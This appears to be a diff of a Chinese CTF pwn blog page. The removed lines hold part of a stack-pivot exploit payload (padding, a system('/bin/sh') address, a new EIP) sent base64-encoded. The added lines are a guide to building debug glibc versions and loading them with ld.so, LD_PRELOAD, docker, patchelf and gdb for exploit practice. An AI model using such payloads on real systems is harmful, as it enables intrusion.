+<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#注释头</span></span><br><span class="line"></span><br><span class="line">tar -xvf glibc-2.32.tar.gz</span><br><span class="line">mkdir glibc-2.32_build</span><br><span class="line">mkdir glibc-2.32_out</span><br></pre></td></tr></table></div></figure>
 
-<p>之后确定payload的组成：</p>
-<p>payload = padding + eip + input_addr。</p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">payload = &quot;aaaa&quot;				#padding</span><br><span class="line">payload += p32(0x08049284)		</span><br><span class="line">#system(&quot;/bin/sh&quot;)地址，整个payload被复制到bss上，栈劫持后retn时栈顶在这里</span><br><span class="line">payload += p32(0x0811eb40)		#新的eip地址</span><br></pre></td></tr></table></div></figure>
+<p>3.编译：</p>
+<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#注释头</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> glibc-2.32_build</span><br><span class="line">../glibc-2.32/configure <span class="string">&#x27;--prefix=/home/hacker/glibc/2.32/glibc-2.32_out --disable-werror --enable-debug=yes&#x27;</span></span><br><span class="line">make</span><br></pre></td></tr></table></div></figure>
 
-<p>最后得注意发送的是base64编码之后的payload。</p>
-<p>参考资料:</p>
-<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://bbs.ichunqiu.com/forum.php?mod=collection&amp;action=view&amp;ctid=157" >https://bbs.ichunqiu.com/forum.php?mod=collection&amp;action=view&amp;ctid=157</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p>这里的–prefix=****需要一个绝对路径，不能时相对路径，对于pwn来说就好了，不用再接着往下安装了。不过这是64位的，32位得如下：</p>
+<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#注释头</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> glibc-2.32_build</span><br><span class="line">CC=<span class="string">&quot;gcc -m32&quot;</span> CXX=<span class="string">&quot;g++ -m32&quot;</span> \</span><br><span class="line">../glibc-2.32/configure <span class="string">&#x27;--prefix=/home/hacker/glibc/2.32/glibc-2.32_out --disable-werror --enable-debug=yes --host=i686-linux-gnu --build=i686-lin    ux-gnu&#x27;</span> </span><br><span class="line">make</span><br></pre></td></tr></table></div></figure>
+
+<p>基本是差不多的。</p>
+<p>4.找libc.so 和 ld.so文件：</p>
+<p>(1)libc.so 在glibc-2.32_build目录下<br>(2)ld.so 在glibc-2.32_build/elf 目录下</p>
+<p>5.使用：</p>
+<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#注释头</span></span><br><span class="line"></span><br><span class="line">p = process([<span class="string">&#x27;/home/hacker/glibc/2.32/glibc-2.32_build/elf/ld.so&#x27;</span>, <span class="string">&#x27;./pwn&#x27;</span>], env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:<span class="string">&quot;/home/hacker/glibc/2.32/glibc-2.32_build/libc.so.6&quot;</span>&#125;)</span><br></pre></td></tr></table></div></figure>
+
+<p>这样就可以gdb调试的时候带符号表，然后还有源码：</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-30_20-51-09.png" alt="img"></p>
+<p>▲关于ld.so的连接使用，最好还是用编译配套的，不然容易出错。如果不需要源码，只需要按照的libc和ld，就可以make install。然后在glibc-2.32_out/lib/下就能找到这两个文件了。</p>
+<p>二、对应docker下载：</p>
+<p>1.搜对应版本libc对应的ubuntu，比如libc-2.27就对应ubuntu18.04，然后pull下来。</p>
+<p>2.然后将对应版本的docker源sources.list拷贝进去，然后我这边自己总结了一份安装脚本，一键运行，省去很多麻烦。(记得先备份一下，防止出错)</p>
+<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker cp sources.list [dockerName]:/etc/apt/</span><br><span class="line">docker cp install.sh [dockerName]:/</span><br><span class="line">chmod a+x install.sh</span><br><span class="line">./install.sh</span><br></pre></td></tr></table></div></figure>
+
+<p>装完之后基本的环境就有了，pwndbg，python，pwntools等等，其他的自己慢慢安装吧。</p>
+<p>▲有个pwn_docker也挺好使的：</p>
+<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#注释头</span></span><br><span class="line"></span><br><span class="line">docker pull pwn_docker</span><br></pre></td></tr></table></div></figure>
+
+<p>里面运行也类似不同版本的libc:</p>
+<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#注释头 </span></span><br><span class="line">p</span><br><span class="line">p = process([<span class="string">&#x27;/glibc/2.24/64/lib/ld-linux-x86-64.so.2&#x27;</span>, <span class="string">&#x27;./pwn&#x27;</span>], env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:<span class="string">&quot;/glibc/2.24/64/lib/libc-2.24.so&quot;</span>&#125;)</span><br></pre></td></tr></table></div></figure>
+
+<p>三、工具使用：LibcSearcher</p>
+<p>这个算是最常用了，很好用，直接去github上找很多，外面也有很多教程。</p>
+<p>四、patchelf：直接修改ELF文件加载的libc</p>
+<p>1.安装：</p>
+<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#注释头</span></span><br><span class="line"></span><br><span class="line">sudo apt-get install autoconf automake libtool</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/NixOS/patchelf.git</span><br><span class="line">./bootstrap.sh</span><br><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">make check</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></div></figure>
+
+<p>编译环境啥的都要有</p>
+<p>2.使用：</p>
+<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/NixOS/patchelf" >https://github.com/NixOS/patchelf</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#注释头</span></span><br><span class="line"></span><br><span class="line">patchelf --set-interpreter /home/hacker/glibc/2.23/64/lib/ld-2.23.so --set-rpath /home/hacker/glibc/2.23/64/lib/ ./pwn</span><br></pre></td></tr></table></div></figure>
+
+<p>这个可以直接gdb调试，不用再用python打开指定环境。</p>
+<p>五、gdb指定源码级别调试：</p>
+<p>▲有时候用Patchelf切换之后，想调试对应版本的glibc源码</p>
+<p>1.gdb打开后直接命令输入指定：</p>
+<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#注释头</span></span><br><span class="line"></span><br><span class="line">dir /home/hacker/glibc-src/glibc-2.23/malloc</span><br></pre></td></tr></table></div></figure>
+
+<p>2.gdb环境配置输入：</p>
+<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#注释头</span></span><br><span class="line"></span><br><span class="line">vim ~/.gdbinit</span><br><span class="line">dir /home/hacker/glibc-src/glibc-2.23/malloc</span><br></pre></td></tr></table></div></figure>
+
+<p>但是这有个问题，如果需要对应版本则没办法，只会加载到最下面的版本，所以一般patchelf之后，指定dir即可。</p>
 </div></div></article></section><nav class="paginator"><div class="paginator-inner"><a class="extend prev" rel="prev" href="/page/8/"><i class="fas fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/8/">8</a><span class="page-number current">9</span><a class="page-number" href="/page/10/">10</a><a class="page-number" href="/page/11/">11</a><a class="extend next" rel="next" href="/page/10/"><i class="fas fa-angle-right"></i></a></div></nav></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><section class="sidebar-toc hide"></section><!-- ov = overview--><section class="sidebar-ov"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsauthor.jpg" alt="avatar"></div><p class="sidebar-ov-author__text">The way forward</p></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">108</div><div class="sidebar-ov-state-item__name">Archives</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--categories" href="/categories/"><div class="sidebar-ov-state-item__count">49</div><div class="sidebar-ov-state-item__name">Categories</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--tags" href="/tags/"><div class="sidebar-ov-state-item__count">50</div><div class="sidebar-ov-state-item__name">Tags</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="Creative Commons" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2022</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>PIG-007</span></div><div><span>Powered by <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a></span><span> v5.4.0</span><span class="footer__devider">|</span><span>Theme - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.6.2</span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><div class="search-mask"></div><div class="search-popup"><span class="search-close"></span><div class="search-input"><input placeholder="Search for Posts (Support multiple keywords)"></div><div class="search-results"></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script>function initSearch() {
   var isXML = true;
   var search_path = 'search.json';
